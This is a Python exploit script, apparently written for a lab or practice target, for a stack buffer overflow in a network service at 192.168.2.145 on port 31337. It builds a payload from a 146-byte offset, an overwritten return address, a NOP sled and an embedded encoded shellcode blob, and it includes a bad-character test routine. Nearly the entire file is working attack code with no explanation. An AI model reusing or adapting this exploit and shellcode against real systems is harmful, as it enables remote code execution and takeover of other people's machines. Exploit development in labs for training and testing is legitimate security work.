import socket
import sys
from struct import pack

class Exploit:
    RHOST = '192.168.2.145'
    RPORT = 31337
    BUF_SIZE = 1024
    
    # root@kali:~# msf-pattern_offset -l 1024 -q 39654138
    # [*] Exact match at offset 146
    OFFSET = 146

    @classmethod
    def create_socket(cls):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return sock
    
    @classmethod
    def convert_to_bin(cls, hex_addr):
        return pack("<I", hex_addr)

    @classmethod
    def generate_badchar(cls):
        badchar_test_str = b""
        badchars = [0x00, 0x0A]

        for i in range(0x00, 0xFF+1):
            if i not in badchars:
                badchar_test_str += pack("B", i)
                                
        with open("badchar_test.bin", "wb") as badchar_file:
            badchar_file.write(badchar_test_str)

        return badchar_test_str

    @classmethod 
    def send_data(cls, buf):
        try:
            sock = cls.create_socket()
            sock.connect((cls.RHOST, cls.RPORT))
            sock.sendall(buf)

            print(f"[+] Sending out - {buf}")

            data_from_server = sock.recv(cls.BUF_SIZE)
            print(f"[>] Data from server - {data_from_server}")

        except ConnectionResetError as error:
            print(f"[!] {error}")

        finally:
            sock.close()

    @classmethod
    def execute_badchar_test(cls):
        junk = b"A" * cls.OFFSET

        eip = cls.convert_to_bin(0xdeadbeef)
        badchar_test_str = cls.generate_badchar()

        buf =  b""
        buf += junk
        buf += eip
        buf += badchar_test_str
        buf += b"\x44" * (cls.BUF_SIZE - len(buf))
        buf += b"\n"

        cls.send_data(buf)

    @classmethod
    def execute_exploit(cls):
        junk = b"A" * cls.OFFSET
        eip = cls.convert_to_bin(0x080414C3)
        nop_sled = b"\x90" * 64

        shellcode =  b""
        shellcode += b"\xd9\xc5\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x52\xb8\x8e"
        shellcode += b"\x90\xb7\x39\x31\x43\x17\x83\xeb\xfc\x03\xcd\x83\x55"
        shellcode += b"\xcc\x2d\x4b\x1b\x2f\xcd\x8c\x7c\xb9\x28\xbd\xbc\xdd"
        shellcode += b"\x39\xee\x0c\x95\x6f\x03\xe6\xfb\x9b\x90\x8a\xd3\xac"
        shellcode += b"\x11\x20\x02\x83\xa2\x19\x76\x82\x20\x60\xab\x64\x18"
        shellcode += b"\xab\xbe\x65\x5d\xd6\x33\x37\x36\x9c\xe6\xa7\x33\xe8"
        shellcode += b"\x3a\x4c\x0f\xfc\x3a\xb1\xd8\xff\x6b\x64\x52\xa6\xab"
        shellcode += b"\x87\xb7\xd2\xe5\x9f\xd4\xdf\xbc\x14\x2e\xab\x3e\xfc"
        shellcode += b"\x7e\x54\xec\xc1\x4e\xa7\xec\x06\x68\x58\x9b\x7e\x8a"
        shellcode += b"\xe5\x9c\x45\xf0\x31\x28\x5d\x52\xb1\x8a\xb9\x62\x16"
        shellcode += b"\x4c\x4a\x68\xd3\x1a\x14\x6d\xe2\xcf\x2f\x89\x6f\xee"
        shellcode += b"\xff\x1b\x2b\xd5\xdb\x40\xef\x74\x7a\x2d\x5e\x88\x9c"
        shellcode += b"\x8e\x3f\x2c\xd7\x23\x2b\x5d\xba\x2b\x98\x6c\x44\xac"
        shellcode += b"\xb6\xe7\x37\x9e\x19\x5c\xdf\x92\xd2\x7a\x18\xd4\xc8"
        shellcode += b"\x3b\xb6\x2b\xf3\x3b\x9f\xef\xa7\x6b\xb7\xc6\xc7\xe7"
        shellcode += b"\x47\xe6\x1d\xa7\x17\x48\xce\x08\xc7\x28\xbe\xe0\x0d"
        shellcode += b"\xa7\xe1\x11\x2e\x6d\x8a\xb8\xd5\xe6\x75\x94\xd7\xaa"
        shellcode += b"\x1d\xe7\xd7\x43\x82\x6e\x31\x09\x2a\x27\xea\xa6\xd3"
        shellcode += b"\x62\x60\x56\x1b\xb9\x0d\x58\x97\x4e\xf2\x17\x50\x3a"
        shellcode += b"\xe0\xc0\x90\x71\x5a\x46\xae\xaf\xf2\x04\x3d\x34\x02"
        shellcode += b"\x42\x5e\xe3\x55\x03\x90\xfa\x33\xb9\x8b\x54\x21\x40"
        shellcode += b"\x4d\x9e\xe1\x9f\xae\x21\xe8\x52\x8a\x05\xfa\xaa\x13"
        shellcode += b"\x02\xae\x62\x42\xdc\x18\xc5\x3c\xae\xf2\x9f\x93\x78"
        shellcode += b"\x92\x66\xd8\xba\xe4\x66\x35\x4d\x08\xd6\xe0\x08\x37"
        shellcode += b"\xd7\x64\x9d\x40\x05\x15\x62\x9b\x8d\x35\x81\x09\xf8"
        shellcode += b"\xdd\x1c\xd8\x41\x80\x9e\x37\x85\xbd\x1c\xbd\x76\x3a"
        shellcode += b"\x3c\xb4\x73\x06\xfa\x25\x0e\x17\x6f\x49\xbd\x18\xba"

        buf =  b""
        buf += junk
        buf += eip
        buf += nop_sled
        buf += shellcode
        buf += b"\x44" * (cls.BUF_SIZE - len(buf))
        buf += b"\n"

        cls.send_data(buf)

if __name__ == "__main__":
    #Exploit.execute_exploit()
    Exploit.execute_badchar_test()